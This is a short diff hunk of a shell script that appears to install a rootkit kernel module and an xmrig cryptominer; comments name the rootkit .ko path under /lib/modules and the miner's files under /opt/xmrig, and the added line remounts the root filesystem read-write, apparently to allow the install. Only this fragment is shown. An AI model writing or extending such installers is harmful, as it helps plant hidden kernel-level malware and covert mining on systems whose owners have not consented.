@@ -6,6 +6,7 @@
 #rootkit .ko /lib/modules/$(uname -r)/extra/rootkit.ko
 #xmrig binary and config file /opt/xmrig/FILES
 
+mount -o remount,rw /
 module_compile_dir="/boot/rootkit/src"
 module_dir="/lib/modules/$(uname -r)/extra"
 
